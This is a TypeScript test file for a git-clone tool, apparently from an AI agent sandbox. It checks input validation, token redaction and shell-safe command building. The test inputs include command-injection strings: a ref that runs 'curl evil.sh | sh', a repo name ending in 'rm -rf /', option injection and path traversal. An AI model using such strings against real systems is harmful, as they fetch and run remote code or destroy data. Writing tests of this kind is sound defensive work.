import { afterEach, describe, expect, it, vi } from "vitest";
import type { Executor } from "../../executors/interface.js";
import { buildCloneCommand } from "../../executors/git-clone-command.js";
import { createGitCloneTool, isValidRef, isValidRepo } from "../git-clone.js";

const TOKEN = "ghs_supersecrettoken000000000000000000";

/**
 * Executor stub that records every exec() command and cloneRepo() call, so the
 * assertions below are about exactly what would reach the sandbox.
 */
function stubExecutor() {
  const commands: string[] = [];
  const clones: Array<{ url: string; path: string; ref?: string; password?: string }> = [];
  const executor: Executor = {
    init: vi.fn(async () => {}),
    isReady: () => true,
    getWorkspacePath: () => "/workspace",
    exec: vi.fn(async (command: string) => {
      commands.push(command);
      return { stdout: "abc1234 initial commit", stderr: "", code: 0 };
    }),
    writeFile: vi.fn(async () => {}),
    readFile: vi.fn(async () => ""),
    destroy: vi.fn(async () => {}),
    hasNativeGit: () => true,
    // Mirror the real executors: build the actual command and record it, so
    // assertions about what reaches the shell exercise the protected path
    // rather than passing vacuously.
    cloneRepo: vi.fn(async (url, path, options) => {
      clones.push({ url, path, ref: options?.ref, password: options?.password });
      const { command } = buildCloneCommand({
        url,
        dest: path,
        ref: options?.ref,
        username: options?.username,
        password: options?.password,
      });
      commands.push(command);
    }),
  };
  return { executor, commands, clones };
}

afterEach(() => vi.unstubAllGlobals());

function stubTokenFetch() {
  vi.stubGlobal(
    "fetch",
    vi.fn(
      async () =>
        new Response(JSON.stringify({ token: TOKEN, github_username: "octocat" }), {
          status: 200,
        }),
    ),
  );
}

async function run(params: { label: string; repo: string; ref?: string }) {
  const { executor, commands, clones } = stubExecutor();
  stubTokenFetch();
  const tool = createGitCloneTool("ws_1", "http://ui.test", executor);
  const result = await tool.execute({} as never, params as never);
  const text = result.content.map((c) => ("text" in c ? c.text : "")).join("\n");
  return { text, commands, clones };
}

describe("ref validation", () => {
  it.each([
    ['main" ; curl evil.sh | sh ; "', "shell metacharacters"],
    ["--upload-pack=evil", "leading dash is parsed by git as an option"],
    ["../../etc/passwd", "path traversal"],
    ["feature/", "trailing slash"],
    ["refs/heads/x.lock", ".lock suffix"],
    // git check-ref-format structural rules
    ["/main", "leading slash gives an empty component"],
    ["foo//bar", "empty component"],
    ["foo/.bar", "component starting with a dot"],
    ["foo.", "trailing dot"],
    ["a/b.lock", ".lock on any component"],
    ["main@{1}", "reflog syntax"],
    ["@", "bare @"],
    ["", "empty"],
    ["a b", "space"],
    ["a~1", "tilde"],
    ["a^2", "caret"],
    ["a:b", "colon"],
    ["a?b", "question mark"],
    ["a*b", "asterisk"],
    ["a[b", "open bracket"],
    ["a\\b", "backslash"],
  ])("rejects %j (%s)", (ref) => {
    expect(isValidRef(ref)).toBe(false);
  });

  it.each([
    "main",
    "v1.2.3",
    "feature/my-branch",
    "release-2026.08",
    "a1b2c3d4e5f6",
    // Git permits these; they never reach a shell, so they must not be rejected.
    "feature/foo+bar",
    "release=v1",
    "topic@review",
    "list,of,things",
    "user.name/feature",
  ])("accepts legitimate ref %j", (ref) => {
    expect(isValidRef(ref)).toBe(true);
  });
});

describe("git-legal refs that look dangerous", () => {
  // git permits $ ( ) and backticks in ref names. We accept them, because
  // safety comes from the transport, not the character set: the ref is passed
  // in GIT_REF and referenced as "$GIT_REF", and the shell does not re-expand
  // the *value* of a variable. Rejecting them would break valid branches for
  // no security gain.
  it.each(["$(id)", "`id`", "a$b"])("accepts %j but never expands it", (ref) => {
    expect(isValidRef(ref)).toBe(true);
    const { command, env } = buildCloneCommand({ url: "u", dest: "d", ref });
    expect(command).not.toContain(ref);
    expect(command).toContain('"$GIT_REF"');
    expect(env.GIT_REF).toBe(ref);
  });
});

describe("repo validation", () => {
  it.each(["owner/repo; rm -rf /", "owner/../../etc", "owner", "a/b/c", "own er/repo"])(
    "rejects %j",
    (repo) => {
      expect(isValidRepo(repo)).toBe(false);
    },
  );

  it.each(["traceroot-ai/traceroot", "owner/repo.name", "a_b/c-d"])("accepts %j", (repo) => {
    expect(isValidRepo(repo)).toBe(true);
  });
});

describe("git_clone tool", () => {
  it("refuses a hostile ref without touching the sandbox", async () => {
    const { text, clones } = await run({
      label: "x",
      repo: "traceroot-ai/traceroot",
      ref: 'main" ; curl evil.sh | sh ; "',
    });
    expect(text).toContain("Invalid ref");
    expect(clones).toHaveLength(0);
  });

  it("refuses a hostile repo without touching the sandbox", async () => {
    const { text, clones } = await run({ label: "x", repo: "owner/repo; rm -rf /" });
    expect(text).toContain("Invalid repository");
    expect(clones).toHaveLength(0);
  });

  it("clones a legitimate repo through cloneRepo", async () => {
    const { clones } = await run({
      label: "x",
      repo: "traceroot-ai/traceroot",
      ref: "feature/my-branch",
    });
    expect(clones).toHaveLength(1);
    expect(clones[0].url).toBe("https://github.com/traceroot-ai/traceroot.git");
    expect(clones[0].ref).toBe("feature/my-branch");
  });

  it("reports a clone failure with the token redacted", async () => {
    const { executor } = stubExecutor();
    (executor.cloneRepo as ReturnType<typeof vi.fn>).mockRejectedValueOnce(
      new Error(`fatal: could not read Username for 'https://x-access-token:${TOKEN}@github.com'`),
    );
    stubTokenFetch();
    const tool = createGitCloneTool("ws_1", "http://ui.test", executor);
    const result = await tool.execute(
      {} as never,
      {
        label: "x",
        repo: "traceroot-ai/traceroot",
      } as never,
    );
    const text = result.content.map((c) => ("text" in c ? c.text : "")).join("\n");
    expect(text).toContain("Clone failed");
    expect(text).toContain("[REDACTED]");
    expect(text).not.toContain(TOKEN);
  });

  it("returns a clear message when no GitHub App is installed", async () => {
    const { executor, clones } = stubExecutor();
    vi.stubGlobal(
      "fetch",
      vi.fn(async () => new Response("nope", { status: 404 })),
    );
    const tool = createGitCloneTool("ws_1", "http://ui.test", executor);
    const result = await tool.execute(
      {} as never,
      {
        label: "x",
        repo: "traceroot-ai/traceroot",
      } as never,
    );
    const text = result.content.map((c) => ("text" in c ? c.text : "")).join("\n");
    expect(text).toContain("No GitHub App installed");
    expect(clones).toHaveLength(0);
  });

  it("never puts the token in a shell command", async () => {
    const { commands } = await run({ label: "x", repo: "traceroot-ai/traceroot", ref: "main" });
    for (const command of commands) {
      expect(command).not.toContain(TOKEN);
    }
  });
});

describe("buildCloneCommand", () => {
  it("keeps every caller value out of the command string", () => {
    const { command, env } = buildCloneCommand({
      url: "https://github.com/o/r.git",
      dest: "/workspace/repos/o_r",
      ref: 'main" ; id ; "',
      password: TOKEN,
    });
    expect(command).not.toContain(TOKEN);
    expect(command).not.toContain("id ;");
    expect(command).not.toContain("/workspace/repos/o_r");
    expect(command).toContain('"$GIT_REF"');
    expect(command).toContain('"$GIT_URL"');
    expect(env.GIT_PASSWORD).toBe(TOKEN);
  });

  it("uses -- so a ref can never be read as an option", () => {
    const { command } = buildCloneCommand({ url: "u", dest: "d" });
    expect(command).toContain('-- "$GIT_URL" "$GIT_DEST"');
  });

  it("clones then checks out for a commit SHA", () => {
    const { command } = buildCloneCommand({ url: "u", dest: "d", ref: "a1b2c3d4e5f6" });
    expect(command).toContain("checkout");
    expect(command).not.toContain("--branch");
  });

  it("neutralizes inherited credential helpers and repo hooks", () => {
    const { command } = buildCloneCommand({ url: "u", dest: "d" });
    expect(command).toContain("credential.helper=");
    expect(command).toContain("core.hooksPath=/dev/null");
  });
});
